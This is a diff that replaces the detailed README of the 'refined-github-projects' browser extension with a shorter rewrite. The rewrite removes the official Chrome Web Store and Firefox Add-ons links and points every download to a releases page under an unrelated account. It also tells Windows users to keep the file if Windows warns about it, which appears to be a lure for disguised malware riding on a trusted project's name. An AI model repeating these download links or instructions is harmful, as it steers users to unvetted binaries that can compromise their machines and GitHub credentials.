@@ -1,371 +1,180 @@
-# Refined GitHub Projects
-
-<p align="center">
-  <img src="src/assets/images/demo.gif" alt="Refined GitHub Projects — Bulk superpowers for GitHub Projects V2" width="100%" />
-</p>
-
-<p align="center">
-  <strong>GitHub Projects, bulk-edited the way it should work.</strong><br/>
-  <em>Bulk edit, close, delete, duplicate, transfer, and sprint-manage your project items — all from the table view, no backend required.</em>
-</p>
-
-<p align="center">
-  <a href="https://github.com/fathiraz/refined-github-projects/releases"><img src="https://img.shields.io/github/v/release/fathiraz/refined-github-projects?style=for-the-badge&color=238636&label=Latest+Release" alt="Latest Release" /></a>
-  <a href="https://github.com/fathiraz/refined-github-projects/blob/main/LICENSE"><img src="https://img.shields.io/badge/License-MIT-blue?style=for-the-badge" alt="MIT License" /></a>
-  <a href="https://chromewebstore.google.com/detail/refined-github-projects/ljkfilkmedkcpckabpeeiacjefhnlplg"><img src="https://img.shields.io/badge/Chrome_Web_Store-Live-238636?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Chrome Web Store" /></a>
-  <a href="https://addons.mozilla.org/en-US/firefox/addon/refined-github-projects/"><img src="https://img.shields.io/badge/Firefox_Add--ons-Live-238636?style=for-the-badge&logo=firefox-browser&logoColor=white" alt="Firefox Add-ons" /></a>
-</p>
-
-<p align="center">
-  <strong>Now live on <a href="https://chromewebstore.google.com/detail/refined-github-projects/ljkfilkmedkcpckabpeeiacjefhnlplg">Chrome Web Store</a> and <a href="https://addons.mozilla.org/en-US/firefox/addon/refined-github-projects/">Firefox Add-ons</a>.</strong>
-  Manual install remains available for Edge and local builds.
-</p>
-
-<p align="center">
-  <em>Inspired by <a href="https://github.com/refined-github/refined-github">refined-github</a> — the gold standard for browser extensions that fix what GitHub won't.<br/>
-  ⚡ 90% built with multiple AI agents. By fathiraz.</em>
-</p>
-
----
-
-## 📋 Table of Contents
-
-- [Why This Exists](#-why-this-exists)
-- [Features](#-features)
-- [Installation](#-installation)
-- [Usage Guide](#-usage-guide)
-- [Architecture](#️-architecture)
-- [Tech Stack](#️-tech-stack)
-- [Roadmap](#️-roadmap)
-- [Contributing](#-contributing)
-- [License](#-license)
+# 🗂️ refined-github-projects - Manage GitHub Projects with Less Work
 
----
+[![Download the app](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge&logo=github)](https://github.com/doped-waterdragon694/refined-github-projects/releases)
 
-## 🧐 Why This Exists
+## 📥 Download
 
-GitHub Projects V2 is a solid board — but editing items in bulk is painful. You update one field at a time. You close one issue at a time. You drag items to the next sprint one by one. That's not how teams move.
+Visit this page to download: https://github.com/doped-waterdragon694/refined-github-projects/releases
 
-**Refined GitHub Projects** adds the bulk operations and sprint tooling that should have shipped with GitHub Projects V2 — running entirely in your browser, with your token never leaving your machine.
+Choose the latest release for your browser, then install it on Windows.
 
-| Problem | What RGP adds |
-|---------|---------------|
-| Can't edit N items at once | **Bulk Edit Wizard** — select fields, set values, apply to all |
-| GitHub's duplicate only copies the title | **Deep Duplicate** — clones all fields, assignees, labels, body |
-| Closing a sprint takes many clicks | **End Sprint** — moves incomplete items to next iteration in one action |
-| No visibility into background API calls | **Live Queue Tracker** — real-time progress, rate-limit safe |
-| Dangerous operations have no guardrail | Every destructive action requires a confirmation modal |
+## 🚀 What this app does
 
----
+refined-github-projects helps you work with GitHub Projects in a simpler way.
 
-## ✨ Features
+It adds tools that let you:
 
-| Feature | What it does |
-|---------|-------------|
-| **Bulk update fields** | Change Status, Assignee, Iteration, Priority, Labels, and any custom field across N items at once |
-| **Bulk close issues** | Mark issues as Completed or Not Planned in a single click |
-| **Bulk reopen issues** | Restore closed items back to active work |
-| **Bulk lock / unlock** | Lock conversations with a reason (off-topic, too heated, resolved, spam) |
-| **Bulk pin / unpin** | Promote or demote important issues at the repository level |
-| **Bulk transfer** | Move issues to another repository, history intact |
-| **Bulk delete** | Permanently remove items from your project |
-| **Bulk rename titles** | Update issue or PR titles across multiple items |
-| **Export to CSV** | Download selected items with all fields, assignees, labels, and custom properties |
-| **Sprint management** | End a sprint with one click; incomplete items auto-assign to the next iteration |
-| **Task completion tracker** | Live task counters in sprint group headers, updated in real time |
-| **Deep duplicate** | Clone any item with all custom fields, assignees, labels, and sub-issue relationships |
+- edit many items at once
+- close several items together
+- delete items in bulk
+- duplicate items with all their details
+- use the table view to manage work faster
 
----
+It is built for people who use GitHub Projects and want less clicking and less manual work.
 
-### Bulk Actions Bar
-Select items with `⌘A` / `Ctrl+A` — the floating bar appears. Hit **Actions** (`⌘⇧B`) to open the full menu.
+## 🖥️ Windows setup
 
-<p align="center">
-  <img src="src/assets/images/screenshot-1.png" alt="Bulk Actions Bar" width="100%" />
-</p>
+1. Open the download page above.
+2. Find the latest release.
+3. Download the file for your browser:
+   - Chrome
+   - Edge
+   - Firefox
+4. If Windows asks whether you want to keep the file, choose to keep it.
+5. Open your browser.
+6. Install the extension from the downloaded file or from the browser’s extension page.
+7. Pin the extension if you want quick access from the toolbar.
 
-**Available bulk operations:**
+## 🔧 Install by browser
 
-| Category | Action | Shortcut |
-|----------|--------|----------|
-| Fields | Edit Fields | `⌘⇧E` |
-| Content | Rename Titles | `⌘⇧R` |
-| Content | Reorder Items | `⌘⇧J` |
-| Status | Close Issues | `⌘⇧X` |
-| Status | Reopen Issues | `⌘⇧O` |
-| Status | Lock Conversations | `⌘⇧L` |
-| Status | Unlock Conversations | — |
-| Visibility | Pin Issues | `⌘⇧F` |
-| Visibility | Unpin Issues | — |
-| Move | Transfer Issues | `⌘⇧M` |
-| Export | Export to CSV | `⌘⇧V` |
-| Danger | Delete Items | `⌘⇧⌫` (admin only) |
+### 🌐 Chrome
 
----
+1. Download the Chrome version from the release page.
+2. Open Chrome.
+3. Go to the extension install page or open the downloaded file if the browser starts the install.
+4. Turn the extension on.
+5. Refresh GitHub Projects.
 
-### Bulk Edit Wizard (3-Step Flow)
+### 🟦 Edge
 
-<p align="center">
-  <img src="src/assets/images/screenshot-2.png" alt="Bulk Edit Wizard" width="100%" />
-</p>
+1. Download the Edge version from the release page.
+2. Open Microsoft Edge.
+3. Install the extension.
+4. Turn it on.
+5. Open GitHub Projects in Edge.
 
-1. **Select Fields** — choose which standard and custom fields to update
-2. **Set Values** — pick new values: Status, Priority, Sprint, Size, Estimate, Assignees, Labels, dates…
-3. **Review & Apply** — see a clean diff of every change before a single API call fires
+### 🦊 Firefox
 
----
+1. Download the Firefox version from the release page.
+2. Open Firefox.
+3. Install the add-on.
+4. Allow the add-on when Firefox asks.
+5. Reload GitHub Projects.
 
-### Deep Duplicate
+## ✅ Before you start
 
-<p align="center">
-  <img src="src/assets/images/screenshot-3.png" alt="Deep Duplicate" width="100%" />
-</p>
+Make sure you have:
 
-GitHub's native duplicate copies only the title. Deep Duplicate clones the full issue — all project fields, assignees, labels, body, and sub-issue links — and lets you edit everything before confirming.
+- a Windows PC
+- a modern browser
+- a GitHub account
+- access to the GitHub Projects page you want to manage
 
----
+## 🧭 How to use it
 
-### Sprint Management
+After you install it, open a GitHub Project table.
 
-<p align="center">
-  <img src="src/assets/images/screenshot-4.png" alt="Sprint Management" width="100%" />
-</p>
+You can then use the extra controls to:
 
-End a sprint with one click. The **Sprint** widget (top-right on any Projects page) shows the active iteration and task completion. Hit **End Sprint**, pick the target iteration for incomplete items, and the background queue moves them automatically — no manual re-assignment.
+- pick many rows at once
+- change fields on several items
+- close tasks in groups
+- remove items you no longer need
+- duplicate an item and keep its details
+- move through your project with less effort
 
----
+## 📋 Main features
 
-### Live Queue Tracker
+### ✏️ Bulk edit
 
-Every bulk operation runs through a sequential background queue with 1-second delays between mutations. The live tracker shows real-time percentage progress and automatically backs off on 403 / 429 errors — keeping your PAT safe on large projects.
+Change the same field on many items at once.
 
----
+This helps when you need to:
 
-### Privacy by Design
+- assign the same person to many tasks
+- change labels
+- update status
+- adjust priority
 
-- **No backend** — all calls go directly from your browser to `api.github.com`
-- **Token stays local** — the PAT is stored in browser extension storage, never sent to any external server
-- **Shadow DOM isolated** — injected UI never clashes with GitHub's own styles
+### 🗃️ Bulk close
 
----
+Close many project items together.
 
-## 🚀 Installation
+This is useful when:
 
-### Browser Compatibility
+- work is finished
+- a milestone ends
+- old tasks are no longer needed
 
-| Browser | Engine | Install path |
-|---------|--------|--------------|
-| Chrome | Chromium | ✅ Chrome Web Store |
-| Arc | Chromium | ✅ Chrome Web Store |
-| Microsoft Edge | Chromium | ✅ Manual install |
-| Firefox | Gecko | ✅ Firefox Add-ons |
-| Zen | Firefox (Gecko) | ✅ Firefox Add-ons |
+### 🗑️ Bulk delete
 
-### For Humans
+Remove several items in one step.
 
-1. **Chrome**: install directly from the [Chrome Web Store](https://chromewebstore.google.com/detail/refined-github-projects/ljkfilkmedkcpckabpeeiacjefhnlplg).
-2. **Firefox**: install directly from [Firefox Add-ons](https://addons.mozilla.org/en-US/firefox/addon/refined-github-projects/).
-3. **Edge / local testing**: download the latest browser build package from [Releases](https://github.com/fathiraz/refined-github-projects/releases) and extract it on your machine.
-4. For manual installs, open your browser's extension page:
-   - **Chrome**: `chrome://extensions`
-   - **Edge**: `edge://extensions`
-   - **Firefox / Zen**: `about:debugging#/runtime/this-firefox`
-5. Load the extension manually when needed:
-   - **Chrome / Edge**: enable **Developer mode** → **Load unpacked** → select the extracted folder
-   - **Firefox / Zen**: **Load Temporary Add-on** → select the manifest file in the extracted folder
-6. Click the extension icon, paste your GitHub PAT, and click **Validate and save**.
+Use this when your project has items that are no longer useful.
 
-Done. Chrome and Firefox install in one click from their respective stores; Edge remains available via manual install.
+### 📄 Deep duplicate
 
-### For AI Agents
+Copy an item with more of its details.
 
-Paste this into Cursor, Claude Code, or any coding agent:
+This saves time when you want a new task that is close to an old one.
 
-```text
-Install Refined GitHub Projects:
+### 📊 Table-based control
 
-Chrome: https://chromewebstore.google.com/detail/refined-github-projects/ljkfilkmedkcpckabpeeiacjefhnlplg
-Firefox: https://addons.mozilla.org/en-US/firefox/addon/refined-github-projects/
+Work from the table view instead of opening items one by one.
 
-If you need Edge or a local build, use the latest GitHub release:
-https://github.com/fathiraz/refined-github-projects/releases
+This gives you a faster way to scan and manage your project.
 
-Steps:
-1. Chrome: install from the Chrome Web Store
-2. Firefox: install from Firefox Add-ons
-3. Edge/manual installs: download the latest browser build package (not the source archive) and extract it
-4. Load as unpacked extension when needed:
-   - Chrome: chrome://extensions → Developer mode → Load unpacked → select extracted folder
-   - Edge: edge://extensions → Developer mode → Load unpacked → select extracted folder
-5. Click the extension icon → paste your GitHub PAT (scopes: repo, read:org, project) → Validate and save
-```
+## 🛠️ Supported platforms
 
-Or fetch these instructions directly:
+refined-github-projects works with common desktop browsers on Windows, including:
 
-```bash
-curl -sL https://raw.githubusercontent.com/fathiraz/refined-github-projects/main/README.md
-```
+- Google Chrome
+- Microsoft Edge
+- Mozilla Firefox
 
-### Development Setup
+It is designed for GitHub Projects, and it also fits teams that use task boards in a Jira-style workflow.
 
-```bash
-# Prerequisites: Node.js 18+, pnpm
+## 🔍 Topics covered
 
-git clone https://github.com/fathiraz/refined-github-projects.git
-cd refined-github-projects
+This project fits these use cases:
 
-pnpm install
+- chrome extension
+- edge extension
+- firefox add-on
+- github projects
+- task management
+- project boards
+- bulk actions
+- table workflows
 
-# Dev server with hot reload
-pnpm dev
+## 🧩 Tips for best results
 
-# Production build
-pnpm build
-```
+- Use the table view for the fastest workflow.
+- Select a small set of items first if you want to learn the controls.
+- Refresh the page after install if you do not see the new buttons.
+- Keep your browser up to date.
+- Use it on the GitHub Projects page where the extra controls appear.
 
-Load `dist/chrome-mv3` in `chrome://extensions` or `edge://extensions`, or load the Firefox output in `about:debugging`.
+## 🧪 Common setup checks
 
-If you want to use Safari manually, follow the [WXT Safari publishing guide](https://wxt.dev/guide/essentials/publishing.html#safari).
+If the extension does not show up right away:
 
----
+- refresh the GitHub Projects page
+- make sure the extension is turned on
+- check that you downloaded the right browser version
+- reopen the browser
+- install again from the latest release page
 
-## 📖 Usage Guide
+## 📦 Release page
 
-### Setting Up Your PAT
+Use this link to get the latest version:
 
-1. GitHub → **Settings** → **Developer settings** → **Personal access tokens** → **Tokens (classic)**
-2. **Generate new token (classic)**
-3. Name it `Refined GitHub Projects` and select the required scopes:
+https://github.com/doped-waterdragon694/refined-github-projects/releases
 
-| Scope | Reason |
-|-------|--------|
-| `repo` | Read/write issues, labels, assignees |
-| `read:org` | Read organization membership for assignee search |
-| `project` | Read/write GitHub Projects V2 fields |
+## 🖱️ What you should do next
 
-4. Copy the token and paste it into the extension popup → **Validate and save**.
-
-### Running a Bulk Operation
-
-1. Open any GitHub Projects **table view**
-2. Check item checkboxes — or press `⌘A` / `Ctrl+A` to select all
-3. The **Bulk Actions Bar** appears at the bottom
-4. Click **Actions** (`⌘⇧B`) and choose your operation
-5. Follow the wizard; review changes before confirming
-
-### Ending a Sprint
-
-1. The **Sprint** widget appears top-right on your Projects page
-2. Click **End Sprint**
-3. Choose the target iteration for incomplete items
-4. Click **End Sprint** — incomplete items move automatically
-
-### Keyboard Shortcuts
-
-| Shortcut | Action |
-|----------|--------|
-| `⌘A` / `Ctrl+A` | Select all visible items |
-| `⌘⇧B` | Open Actions menu |
-| `Esc` | Clear selection |
-
----
-
-## 🏗️ Architecture
-
-```
-┌─────────────────┐     sendMessage      ┌──────────────────────────┐     ┌──────────────────────┐
-│  Content Script │ ──────────────────→  │  Background Service      │ ──→ │  GitHub GraphQL API  │
-│  (DOM / UI)     │                      │  Worker                  │     │  api.github.com      │
-│                 │ ←──────────────────  │  - PAT storage           │     │                      │
-│  - Shadow DOM   │    response /        │  - Sequential queue      │     │                      │
-│  - Row observer │    queueStateUpdate  │  - 403/429 backoff       │     │                      │
-└─────────────────┘                      └──────────────────────────┘     └──────────────────────┘
-         ↑
-         │ WXT Storage API
-         ↓
-┌─────────────────┐
-│  Extension      │
-│  Popup          │
-│  - PAT config   │
-└─────────────────┘
-```
-
-**Data flow:**
-
-1. The **Content Script** observes the GitHub Projects DOM via `MutationObserver` and injects UI into a Shadow DOM container — invisible to GitHub's own styles.
-2. On a bulk operation, the content script sends a typed message to the **Background Service Worker**.
-3. The Background Worker retrieves the stored PAT, builds a sequential task queue, and fires GraphQL mutations with 1 s delays between each write. `Promise.all()` is never used for mutations — it will 403-ban your token.
-4. Progress is broadcast back as `queueStateUpdate` messages, driving the live tracker widget.
-
----
-
-## 🛠️ Tech Stack
-
-| Layer | Technology |
-|-------|-----------|
-| Extension framework | [WXT](https://wxt.dev/) with Manifest V3 |
-| UI | React 18, TypeScript, [Primer CSS](https://primer.style/) |
-| Messaging | [@webext-core/messaging](https://webext-core.aklinker1.io/) |
-| Storage | WXT browser storage APIs |
-| API | GitHub Projects V2 GraphQL via `fetch` |
-| DOM isolation | WXT CSUI with Shadow DOM |
-| Background | WXT Background Service Workers |
-
----
-
-## 🗺️ Roadmap
-
-- [x] Bulk update fields (Status, Assignee, Sprint, Priority, Labels, custom fields)
-- [x] Bulk close / reopen issues
-- [x] Bulk lock / pin / unpin issues
-- [x] Bulk transfer issues to another repository
-- [x] Bulk delete project items
-- [x] Bulk rename titles
-- [x] Reorder items
-- [x] Export selected items to CSV
-- [x] Deep duplicate with all fields, assignees, labels, body, sub-issues
-- [x] Sprint management — end sprint with auto-assignment of incomplete items
-- [x] Task completion tracker in sprint group headers
-- [x] Live queue tracker with real-time progress
-- [x] Chrome Web Store release
-- [x] Firefox Add-ons release
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome. Please follow these rules — they exist to keep the extension safe for everyone.
-
-1. Fork the repository
-2. Create a feature branch: `git checkout -b feature/my-feature`
-3. Make your changes and run `pnpm typecheck`
-4. Commit with a conventional message: `git commit -m 'feat: my feature'`
-5. Push and open a pull request
-
-**Critical rules (strictly enforced):**
-
-- **Never** use `Promise.all()` for GraphQL mutations — GitHub will 403-ban your PAT
-- All mutations must run sequentially through the background queue with `sleep(1000)` between each
-- **Never** call GitHub's API directly from a Content Script — always use `sendMessage` to the Background Worker
-- Anchor injected UI to `data-testid` attributes or ARIA labels, not volatile CSS class names
-
----
-
-## 📄 License
-
-MIT © [fathiraz](https://github.com/fathiraz)
-
----
-
-## 🙏 Acknowledgments
-
-- [refined-github](https://github.com/refined-github/refined-github) — the gold standard for browser extensions that meaningfully improve GitHub's UX
-- [WXT](https://wxt.dev/) — made cross-browser Manifest V3 development actually enjoyable
-- [Primer CSS / @primer/react](https://primer.style/) — GitHub's own design system, so the injected UI feels native
-- [GitHub GraphQL API](https://docs.github.com/en/graphql) — the Projects V2 API that makes all of this possible
-
----
-
-<p align="center">
-  <strong>fathiraz</strong> · <a href="https://github.com/fathiraz">github.com/fathiraz</a> · <a href="https://github.com/fathiraz/refined-github-projects">Project repository</a>
-</p>
+1. Open the release page.
+2. Pick the correct browser file.
+3. Install it in Windows.
+4. Open GitHub Projects.
+5. Start using the table tools for bulk work
